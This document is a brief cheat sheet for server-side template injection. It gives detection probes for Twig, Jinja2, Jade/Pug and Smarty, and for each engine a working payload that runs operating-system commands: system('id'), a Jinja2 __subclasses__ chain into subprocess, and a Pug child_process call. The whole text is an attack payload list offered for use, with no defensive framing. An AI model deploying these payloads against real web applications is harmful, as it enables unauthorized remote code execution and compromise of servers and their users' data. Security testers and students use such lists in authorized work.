# Find the engine
## Twig (PHP)
`{{7*'7'}} -> 49`
### Exploit
`{system("id")}`
## Jinja2 (Python)
`{{7*'7'}} -> 7777777`
### Exploit
`{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(["ls", "-lah"])}}`
## Jade/Pug (JS)
`#{7*7} -> 49`
### Exploit
`#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}`
## Smarty (PHP)
`{'Hello'|upper} -> HELLO`
### Exploit
`{system("id")}`